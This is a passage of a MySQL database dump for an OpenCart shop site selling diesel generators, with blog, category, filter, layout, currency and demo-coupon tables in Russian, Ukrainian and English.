1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,7,1,1,'2016-03-12 18:44:14','2016-03-12 18:44:14'),(10,'','a:42:{s:10:\"blog_small\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:19:\"blog_small_colorbox\";s:1:\"0\";s:8:\"blog_big\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:16:\"blog_subcategory\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:11:\"thumb_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:6:\"images\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"product_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:13:\"gallery_image\";a:2:{s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";}s:10:\"thumb_view\";s:1:\"0\";s:11:\"images_view\";s:1:\"0\";s:16:\"blog_num_records\";s:0:\"\";s:12:\"records_more\";s:1:\"0\";s:17:\"blog_num_comments\";s:0:\"\";s:13:\"blog_num_desc\";s:0:\"\";s:19:\"blog_num_desc_words\";s:0:\"\";s:18:\"blog_num_desc_pred\";s:0:\"\";s:13:\"blog_template\";s:0:\"\";s:19:\"block_records_width\";s:0:\"\";s:20:\"blog_template_record\";s:0:\"\";s:21:\"blog_template_comment\";s:0:\"\";s:5:\"order\";s:6:\"latest\";s:8:\"order_ad\";s:4:\"desc\";s:12:\"status_order\";s:1:\"0\";s:17:\"status_pagination\";s:1:\"1\";s:15:\"category_status\";s:1:\"0\";s:13:\"author_status\";s:1:\"0\";s:20:\"author_record_status\";s:1:\"0\";s:9:\"view_date\";s:1:\"1\";s:10:\"view_share\";s:1:\"1\";s:13:\"view_comments\";s:1:\"1\";s:11:\"view_viewed\";s:1:\"1\";s:11:\"view_rating\";s:1:\"1\";s:8:\"view_rss\";s:1:\"0\";s:12:\"view_captcha\";s:1:\"1\";s:13:\"visual_editor\";s:1:\"1\";s:7:\"bbwidth\";s:0:\"\";s:16:\"end_url_category\";s:0:\"\";s:12:\"blog_devider\";s:1:\"1\";s:15:\"blog_short_path\";s:1:\"0\";s:7:\"further\";a:3:{i:1;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";}s:8:\"reserved\";s:0:\"\";s:16:\"description_full\";s:1:\"0\";}',0,0,0,8,1,1,'2016-03-12 18:53:47','2016-03-12 18:53:47');
/*!40000 ALTER TABLE `oc_blog` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_blog_description` WRITE;
/*!40000 ALTER TABLE `oc_blog_description` DISABLE KEYS */;
INSERT INTO `oc_blog_description` VALUES (1,1,'Тест Катег','Тест Катег','Тест Катег','Тест Катег','Тест Катег','Тест Катег'),(1,3,'Тест Катег','','','','',''),(1,4,'Тест Катег','','','','',''),(6,1,'Услуги','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','Услуги','Услуги','Услуги','Услуги'),(4,1,'Компания','Компания','Компания','Компания','Компания','Компания'),(4,3,'Company','Company','Company','Company','Company','Company'),(4,4,'Компанія','Компанія','Компанія','Компанія','Компанія','Компанія'),(5,1,'Контакты','	&lt;section class=&quot;motivation-image&quot;&gt;\r\n			&lt;img src=&quot;catalog/view/theme/service/image/main-image.jpg&quot; alt=&quot;&quot;&gt;\r\n			&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n				&lt;div class=&quot;we-bring-light&quot;&gt;\r\n					&lt;h2 class=&quot;&quot;&gt;ДАРИМ СВЕТ&lt;/h2&gt;\r\n					&lt;small&gt;КОГДА ЕГО НЕТ&lt;/small&gt;\r\n				&lt;/div&gt;\r\n			&lt;/div&gt;\r\n		&lt;/section&gt;','','','Контакты','Контакты'),(5,3,'Contacts','Contacts','Contacts','Contacts','Contacts','Contacts'),(5,4,'Контакти','Контакти','Контакти','Контакти','Контакти','Контакти'),(8,1,'Блоги','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','Блоги','Блоги','',''),(8,3,'Блоги','','Блоги','Блоги','',''),(8,4,'Блоги','','Блоги','Блоги','',''),(6,3,'Services','Services','Services','Services','Services','Services'),(6,4,'Послуги','Послуги','Послуги','Послуги','Послуги','Послуги'),(9,1,'Новости','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','Новости','Новости','',''),(9,3,'Новости','','','','',''),(9,4,'Новости','','','','',''),(10,1,'Проекты','Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero eius, neque doloribus sed odio culpa dignissimos qui ducimus corporis. Nisi delectus molestias, cum. Nesciunt consequatur amet explicabo, autem omnis nostrum earum inventore fuga magni excepturi neque optio veniam dicta alias cupiditate natus accusamus quae odio quo, animi sed quidem saepe officia. Fuga consequatur, reprehenderit ut error iusto voluptas esse facilis saepe ab! Quisquam adipisci eius fuga excepturi officiis! Labore numquam laborum fugiat dolorem! Sit, nostrum.','Проекты','Проекты','',''),(10,3,'Проекты','','','','',''),(10,4,'Проекты','','','','','');
/*!40000 ALTER TABLE `oc_blog_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_blog_to_layout` WRITE;
/*!40000 ALTER TABLE `oc_blog_to_layout` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_blog_to_layout` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_blog_to_store` WRITE;
/*!40000 ALTER TABLE `oc_blog_to_store` DISABLE KEYS */;
INSERT INTO `oc_blog_to_store` VALUES (1,0),(4,0),(5,0),(6,0),(8,0),(9,0),(10,0);
/*!40000 ALTER TABLE `oc_blog_to_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_category` WRITE;
/*!40000 ALTER TABLE `oc_category` DISABLE KEYS */;
INSERT INTO `oc_category` VALUES (66,'',0,1,1,0,1,'2016-02-28 18:37:14','2016-04-14 15:16:05'),(72,'catalog/demo/ipod_nano_2.jpg',66,0,1,0,1,'2016-03-02 14:16:25','2016-08-10 17:34:08');
/*!40000 ALTER TABLE `oc_category` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_category_description` WRITE;
/*!40000 ALTER TABLE `oc_category_description` DISABLE KEYS */;
INSERT INTO `oc_category_description` VALUES (66,3,'Products','&lt;p&gt;Products&lt;br&gt;&lt;/p&gt;','Products','Products','Products'),(66,4,'Продукція','&lt;p&gt;Продукція&lt;br&gt;&lt;/p&gt;','Продукція','Продукція','Продукція'),(66,1,'Продукция','&lt;p&gt;Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции Описание продукции&amp;nbsp;&lt;/p&gt;','Продукция','Продукция','Продукция'),(72,3,'Дизель генераторы','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','Дизель генераторы','',''),(72,4,'Дизель генераторы','&lt;p&gt;&lt;br&gt;&lt;/p&gt;','Дизель генераторы','',''),(72,1,'Дизельные генераторы','&lt;p&gt;Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов Описание дизельных генераторов&amp;nbsp;&lt;/p&gt;','Дизельные генераторы','','');
/*!40000 ALTER TABLE `oc_category_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_category_filter` WRITE;
/*!40000 ALTER TABLE `oc_category_filter` DISABLE KEYS */;
INSERT INTO `oc_category_filter` VALUES (66,7),(66,8),(66,10),(72,1),(72,2),(72,3),(72,4),(72,5),(72,7),(72,8),(72,9),(72,10);
/*!40000 ALTER TABLE `oc_category_filter` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_category_path` WRITE;
/*!40000 ALTER TABLE `oc_category_path` DISABLE KEYS */;
INSERT INTO `oc_category_path` VALUES (72,66,0),(72,72,1),(66,66,0);
/*!40000 ALTER TABLE `oc_category_path` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_category_to_layout` WRITE;
/*!40000 ALTER TABLE `oc_category_to_layout` DISABLE KEYS */;
INSERT INTO `oc_category_to_layout` VALUES (66,0,17),(72,0,0);
/*!40000 ALTER TABLE `oc_category_to_layout` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_category_to_store` WRITE;
/*!40000 ALTER TABLE `oc_category_to_store` DISABLE KEYS */;
INSERT INTO `oc_category_to_store` VALUES (66,0),(72,0);
/*!40000 ALTER TABLE `oc_category_to_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_comment` WRITE;
/*!40000 ALTER TABLE `oc_comment` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_comment` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_country` WRITE;
/*!40000 ALTER TABLE `oc_country` DISABLE KEYS */;
INSERT INTO `oc_country` VALUES (20,'Белоруссия (Беларусь)','BY','BLR','',0,1),(80,'Грузия','GE','GEO','',0,1),(109,'Казахстан','KZ','KAZ','',0,1),(115,'Киргизия (Кыргызстан)','KG','KGZ','',0,1),(176,'Российская Федерация','RU','RUS','',0,1),(220,'Украина','UA','UKR','',0,1),(226,'Узбекистан','UZ','UZB','',0,1);
/*!40000 ALTER TABLE `oc_country` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_coupon` WRITE;
/*!40000 ALTER TABLE `oc_coupon` DISABLE KEYS */;
INSERT INTO `oc_coupon` VALUES (4,'-10% Discount','2222','P','10.0000',0,0,'0.0000','2014-01-01','2020-01-01',10,'10',0,'2009-01-27 13:55:03'),(5,'Free Shipping','3333','P','0.0000',0,1,'100.0000','2014-01-01','2014-02-01',10,'10',0,'2009-03-14 21:13:53'),(6,'-10.00 Discount','1111','F','10.0000',0,0,'10.0000','2014-01-01','2020-01-01',100000,'10000',0,'2009-03-14 21:15:18');
/*!40000 ALTER TABLE `oc_coupon` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_coupon_category` WRITE;
/*!40000 ALTER TABLE `oc_coupon_category` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_coupon_category` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_coupon_history` WRITE;
/*!40000 ALTER TABLE `oc_coupon_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_coupon_history` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_coupon_product` WRITE;
/*!40000 ALTER TABLE `oc_coupon_product` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_coupon_product` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_currency` WRITE;
/*!40000 ALTER TABLE `oc_currency` DISABLE KEYS */;
INSERT INTO `oc_currency` VALUES (1,'Рубль','RUB','','р.','0',2.59170008,1,'2016-08-10 17:33:14'),(2,'Гривна','UAH','','грн.','',1.00000000,1,'2016-08-10 17:34:51');
/*!40000 ALTER TABLE `oc_currency` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_custom_field` WRITE;
/*!40000 ALTER TABLE `oc_custom_field` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_custom_field` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_custom_field_customer_group` WRITE;
/*!40000 ALTER TABLE `oc_custom_field_customer_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_custom_field_customer_group` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_custom_field_description` WRITE;
/*!40000 ALTER TABLE `oc_custom_field_description` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_custom_field_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_custom_field_value` WRITE;
/*!40000 ALTER TABLE `oc_custom_field_value` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_custom_field_value` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_custom_field_value_description` WRITE;
/*!40000 ALTER TABLE `oc_custom_field_value_description` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_custom_field_value_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer` WRITE;
/*!40000 ALTER TABLE `oc_customer` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_activity` WRITE;
/*!40000 ALTER TABLE `oc_customer_activity` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_activity` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_ban_ip` WRITE;
/*!40000 ALTER TABLE `oc_customer_ban_ip` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_ban_ip` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_group` WRITE;
/*!40000 ALTER TABLE `oc_customer_group` DISABLE KEYS */;
INSERT INTO `oc_customer_group` VALUES (1,0,1);
/*!40000 ALTER TABLE `oc_customer_group` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_group_description` WRITE;
/*!40000 ALTER TABLE `oc_customer_group_description` DISABLE KEYS */;
INSERT INTO `oc_customer_group_description` VALUES (1,1,'Default','test'),(1,4,'Default','test'),(1,3,'Default','test');
/*!40000 ALTER TABLE `oc_customer_group_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_history` WRITE;
/*!40000 ALTER TABLE `oc_customer_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_history` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_ip` WRITE;
/*!40000 ALTER TABLE `oc_customer_ip` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_ip` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_login` WRITE;
/*!40000 ALTER TABLE `oc_customer_login` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_login` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_online` WRITE;
/*!40000 ALTER TABLE `oc_customer_online` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_online` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_reward` WRITE;
/*!40000 ALTER TABLE `oc_customer_reward` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_reward` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_customer_transaction` WRITE;
/*!40000 ALTER TABLE `oc_customer_transaction` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_customer_transaction` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_download` WRITE;
/*!40000 ALTER TABLE `oc_download` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_download` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_download_description` WRITE;
/*!40000 ALTER TABLE `oc_download_description` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_download_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_event` WRITE;
/*!40000 ALTER TABLE `oc_event` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_event` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_extension` WRITE;
/*!40000 ALTER TABLE `oc_extension` DISABLE KEYS */;
INSERT INTO `oc_extension` VALUES (23,'payment','cod'),(22,'total','shipping'),(57,'total','sub_total'),(58,'total','tax'),(59,'total','total'),(410,'module','banner'),(426,'module','carousel'),(390,'total','credit'),(387,'shipping','flat'),(349,'total','handling'),(350,'total','low_order_fee'),(389,'total','coupon'),(413,'module','category'),(408,'module','account'),(393,'total','reward'),(398,'total','voucher'),(407,'payment','free_checkout'),(427,'module','featured'),(419,'module','slideshow'),(428,'module','blog'),(429,'module','html'),(430,'module','filter'),(431,'module','block'),(432,'module','prodline');
/*!40000 ALTER TABLE `oc_extension` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_fields` WRITE;
/*!40000 ALTER TABLE `oc_fields` DISABLE KEYS */;
INSERT INTO `oc_fields` VALUES (1,'  phone','','text',0,0,1,1);
/*!40000 ALTER TABLE `oc_fields` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_fields_description` WRITE;
/*!40000 ALTER TABLE `oc_fields_description` DISABLE KEYS */;
INSERT INTO `oc_fields_description` VALUES (1,4,'','','','YTozOntzOjE3OiJmaWVsZF90ZW1wbGF0ZV9pbiI7czowOiIiO3M6MTg6ImZpZWxkX3RlbXBsYXRlX291dCI7czowOiIiO3M6MTE6ImZpZWxkX2NsYXNzIjtzOjA6IiI7fQ=='),(1,3,'','','','YTozOntzOjE3OiJmaWVsZF90ZW1wbGF0ZV9pbiI7czowOiIiO3M6MTg6ImZpZWxkX3RlbXBsYXRlX291dCI7czowOiIiO3M6MTE6ImZpZWxkX2NsYXNzIjtzOjA6IiI7fQ=='),(1,1,'','','','YTozOntzOjE3OiJmaWVsZF90ZW1wbGF0ZV9pbiI7czowOiIiO3M6MTg6ImZpZWxkX3RlbXBsYXRlX291dCI7czowOiIiO3M6MTE6ImZpZWxkX2NsYXNzIjtzOjA6IiI7fQ==');
/*!40000 ALTER TABLE `oc_fields_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_filter` WRITE;
/*!40000 ALTER TABLE `oc_filter` DISABLE KEYS */;
INSERT INTO `oc_filter` VALUES (5,1,4),(4,1,3),(3,1,2),(1,1,0),(2,1,1),(9,2,3),(8,2,2),(7,2,1),(6,2,0),(10,2,4);
/*!40000 ALTER TABLE `oc_filter` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_filter_description` WRITE;
/*!40000 ALTER TABLE `oc_filter_description` DISABLE KEYS */;
INSERT INTO `oc_filter_description` VALUES (5,3,1,'более 200 кВт'),(5,1,1,'более 200 кВт'),(4,4,1,'100-200 кВт'),(4,3,1,'100-200 кВт'),(4,1,1,'100-200 кВт'),(3,4,1,'60-100 кВт'),(3,3,1,'60-100 кВт'),(3,1,1,'60-100 кВт'),(1,4,1,'до 30 кВт'),(1,3,1,'до 30 кВт'),(1,1,1,'до 30 кВт'),(2,4,1,'30-60 кВт'),(2,3,1,'30-60 кВт'),(2,1,1,'30-60 кВт'),(8,4,2,'Третий двигатель'),(9,1,2,'Четвертый двигатель'),(8,3,2,'Третий двигатель'),(8,1,2,'Третий двигатель'),(7,4,2,'Второй двигатель'),(7,3,2,'Второй двигатель'),(7,1,2,'Второй двигатель'),(6,4,2,'ММЗ (буларусь). 16-108 кВт'),(6,3,2,'ММЗ (буларусь). 16-108 кВт'),(5,4,1,'более 200 кВт'),(6,1,2,'ММЗ (буларусь). 16-108 кВт'),(9,3,2,'Четвертый двигатель'),(9,4,2,'Четвертый двигатель'),(10,1,2,'3LD'),(10,3,2,'3LD'),(10,4,2,'3LD');
/*!40000 ALTER TABLE `oc_filter_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_filter_group` WRITE;
/*!40000 ALTER TABLE `oc_filter_group` DISABLE KEYS */;
INSERT INTO `oc_filter_group` VALUES (1,0),(2,2);
/*!40000 ALTER TABLE `oc_filter_group` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_filter_group_description` WRITE;
/*!40000 ALTER TABLE `oc_filter_group_description` DISABLE KEYS */;
INSERT INTO `oc_filter_group_description` VALUES (1,4,'Мощность двигателя'),(1,3,'Мощность двигателя'),(1,1,'Мощность двигателя'),(2,4,'Двигатель'),(2,3,'Двигатель'),(2,1,'Двигатель');
/*!40000 ALTER TABLE `oc_filter_group_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_geo_zone` WRITE;
/*!40000 ALTER TABLE `oc_geo_zone` DISABLE KEYS */;
INSERT INTO `oc_geo_zone` VALUES (3,'Зона НДС','Облагаемые НДС','2014-09-09 11:48:13','2014-05-21 22:30:20');
/*!40000 ALTER TABLE `oc_geo_zone` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_information` WRITE;
/*!40000 ALTER TABLE `oc_information` DISABLE KEYS */;
INSERT INTO `oc_information` VALUES (3,1,3,1),(4,1,1,1),(5,1,4,1),(6,1,2,1),(7,0,0,1);
/*!40000 ALTER TABLE `oc_information` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_information_description` WRITE;
/*!40000 ALTER TABLE `oc_information_description` DISABLE KEYS */;
INSERT INTO `oc_information_description` VALUES (4,1,'О нас','&lt;p&gt;\r\n	About Us&lt;/p&gt;','О нас','',''),(5,1,'Условия соглашения','&lt;p&gt;\r\n	Terms &amp;amp; Conditions&lt;/p&gt;','Условия соглашения','',''),(3,1,'Политика Безопасности','&lt;p&gt;\r\n	Privacy Policy&lt;/p&gt;','Политика Безопасности','',''),(6,1,'Доставка','&lt;p&gt;\r\n	Delivery Information&lt;/p&gt;','Доставка','',''),(3,4,'Политика Безопасности','&lt;p&gt;\r\n	Privacy Policy&lt;/p&gt;','','',''),(5,4,'Условия соглашения','&lt;p&gt;\r\n	Terms &amp;amp; Conditions&lt;/p&gt;','','',''),(4,4,'О нас','&lt;p&gt;\r\n	About Us&lt;/p&gt;','','',''),(4,3,'О нас','&lt;p&gt;\r\n	About Us&lt;/p&gt;','','',''),(5,3,'Условия соглашения','&lt;p&gt;\r\n	Terms &amp;amp; Conditions&lt;/p&gt;','','',''),(3,3,'Политика Безопасности','&lt;p&gt;\r\n	Privacy Policy&lt;/p&gt;','','',''),(6,3,'Доставка','&lt;p&gt;\r\n	Delivery Information&lt;/p&gt;','','',''),(6,4,'Доставка','&lt;p&gt;\r\n	Delivery Information&lt;/p&gt;','','',''),(7,4,'Фото','  &lt;section class=&quot;motivation-image&quot;&gt;\r\n    &lt;img src=&quot;catalog/view/theme/service/image/main-image.jpg&quot; alt=&quot;&quot;&gt;\r\n    &lt;div class=&quot;wide-body-layout&quot;&gt;\r\n      &lt;div class=&quot;we-bring-light&quot;&gt;\r\n        &lt;h2 class=&quot;&quot;&gt;ДАРИМ СВЕТ&lt;/h2&gt;\r\n        &lt;small&gt;КОГДА ЕГО НЕТ&lt;/small&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n  &lt;/section&gt;','Фото','',''),(7,3,'Фото','  &lt;section class=&quot;motivation-image&quot;&gt;\r\n    &lt;img src=&quot;catalog/view/theme/service/image/main-image.jpg&quot; alt=&quot;&quot;&gt;\r\n    &lt;div class=&quot;wide-body-layout&quot;&gt;\r\n      &lt;div class=&quot;we-bring-light&quot;&gt;\r\n        &lt;h2 class=&quot;&quot;&gt;ДАРИМ СВЕТ&lt;/h2&gt;\r\n        &lt;small&gt;КОГДА ЕГО НЕТ&lt;/small&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n  &lt;/section&gt;','Фото','',''),(7,1,'Фото','&lt;section class=&quot;motivation-image&quot;&gt;    &lt;img src=&quot;catalog/view/theme/service/image/main-image.jpg&quot; alt=&quot;&quot;&gt;    &lt;div class=&quot;wide-body-layout&quot;&gt;      &lt;div class=&quot;we-bring-light&quot;&gt;        &lt;h2 class=&quot;&quot;&gt;ДАРИМ СВЕТ&lt;/h2&gt;\r\n        &lt;small&gt;КОГДА ЕГО НЕТ&lt;/small&gt;      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n  &lt;/section&gt;','Фото','','');
/*!40000 ALTER TABLE `oc_information_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_information_to_layout` WRITE;
/*!40000 ALTER TABLE `oc_information_to_layout` DISABLE KEYS */;
INSERT INTO `oc_information_to_layout` VALUES (7,0,0);
/*!40000 ALTER TABLE `oc_information_to_layout` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_information_to_store` WRITE;
/*!40000 ALTER TABLE `oc_information_to_store` DISABLE KEYS */;
INSERT INTO `oc_information_to_store` VALUES (3,0),(4,0),(5,0),(6,0),(7,0);
/*!40000 ALTER TABLE `oc_information_to_store` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_language` WRITE;
/*!40000 ALTER TABLE `oc_language` DISABLE KEYS */;
INSERT INTO `oc_language` VALUES (1,'Russian','ru','ru_RU.UTF-8,ru_RU,russian','ru.png','russian',1,1),(4,'Ukrainian','ua','ua_UA.UTF-8,ua_UA,ukrainian','ua.png','ukrainian',3,1),(3,'English','en','en_US.UTF-8,en_US,english','us.png','english',2,1);
/*!40000 ALTER TABLE `oc_language` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_layout` WRITE;
/*!40000 ALTER TABLE `oc_layout` DISABLE KEYS */;
INSERT INTO `oc_layout` VALUES (1,'Home'),(2,'Product'),(3,'Category'),(4,'Default'),(5,'Manufacturer'),(6,'Account'),(7,'Checkout'),(8,'Контакты'),(9,'Sitemap'),(10,'Affiliate'),(11,'information'),(12,'Compare'),(13,'Search'),(14,'ЧПУ (not_found)'),(15,'Blog'),(16,'Record'),(17,'Серии'),(18,'Компания'),(19,'Series'),(20,'Блоги'),(21,'Новости'),(22,'Проекты'),(23,'Услуги'),(24,'Категории_комплектующие'),(25,'Сертификаты'),(26,'Контакты моб');
/*!40000 ALTER TABLE `oc_layout` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_layout_module` WRITE;
/*!40000 ALTER TABLE `oc_layout_module` DISABLE KEYS */;
INSERT INTO `oc_layout_module` VALUES (2,4,'0','content_top',0),(3,4,'0','content_top',1),(20,5,'0','column_left',2),(69,10,'affiliate','column_right',1),(68,6,'account','column_right',1),(126,1,'block.34','content_top',1),(82,3,'filter','content_top',0),(125,1,'slideshow.27','content_top',2),(124,1,'block.35','content_top',3),(146,18,'block.38','content_bottom',6),(145,18,'block.37','content_bottom',5),(144,18,'block.36','content_bottom',4),(143,18,'block.33','content_bottom',3),(142,18,'block.41','content_top',1),(123,8,'block.39','content_bottom',2),(122,8,'block.34','content_top',1),(141,18,'block.35','content_bottom',2),(139,11,'block.40','content_bottom',0),(140,25,'block.40','content_bottom',0),(147,20,'block.34','content_top',1),(148,21,'block.34','content_top',1),(149,22,'block.34','content_top',1),(150,23,'block.34','content_top',1);
/*!40000 ALTER TABLE `oc_layout_module` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_layout_route` WRITE;
/*!40000 ALTER TABLE `oc_layout_route` DISABLE KEYS */;
INSERT INTO `oc_layout_route` VALUES (38,6,0,'account/%'),(17,10,0,'affiliate/%'),(65,3,0,'product/category'),(78,1,0,'common/home'),(20,2,0,'product/product'),(88,11,0,'information/information'),(23,7,0,'checkout/%'),(77,8,0,'information/contact'),(32,9,0,'information/sitemap'),(34,4,0,''),(45,5,0,'product/manufacturer'),(52,12,0,'product/compare'),(53,13,0,'product/search'),(54,14,0,'error/not_found'),(55,15,0,'record/blog'),(56,15,0,'record/search'),(57,16,0,'record/record'),(63,17,0,'common/series.tpl'),(90,18,0,'information/company'),(81,19,0,'product/series'),(91,20,0,'custom/blog'),(92,21,0,'custom/news'),(93,22,0,'custom/projects'),(94,23,0,'custom/services'),(87,24,0,'product/category1'),(89,25,0,'information/certificates'),(96,26,0,'custom/company_mobile');
/*!40000 ALTER TABLE `oc_layout_route` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_length_class` WRITE;
/*!40000 ALTER TABLE `oc_length_class` DISABLE KEYS */;
INSERT INTO `oc_length_class` VALUES (1,'1.00000000'),(2,'10.00000000'),(3,'0.39370000');
/*!40000 ALTER TABLE `oc_length_class` ENABLE KEYS */;
